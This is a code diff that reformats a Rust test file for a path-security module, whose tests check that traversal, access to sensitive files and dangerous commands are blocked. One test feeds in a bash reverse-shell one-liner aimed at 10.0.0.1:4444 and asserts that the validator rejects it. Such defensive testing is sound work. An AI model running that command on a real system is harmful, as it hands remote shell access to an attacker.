@@ -1,5 +1,4 @@
-/**
- * Path Security Tests
+/*! Path Security Tests
  *
  * Tests for the path_security module to verify:
  * - Path traversal attacks are blocked
@@ -7,7 +6,6 @@
  * - Sensitive files are protected
  * - Dangerous commands are blocked
  */
-
 #[cfg(test)]
 mod path_security_tests {
     use crate::commands::path_security;
@@ -203,8 +201,7 @@ mod path_security_tests {
 
     #[test]
     fn test_blocked_reverse_shell() {
-        let result =
-            path_security::validate_command("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
+        let result = path_security::validate_command("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
         assert!(result.is_err(), "Should block reverse shells");
     }
 
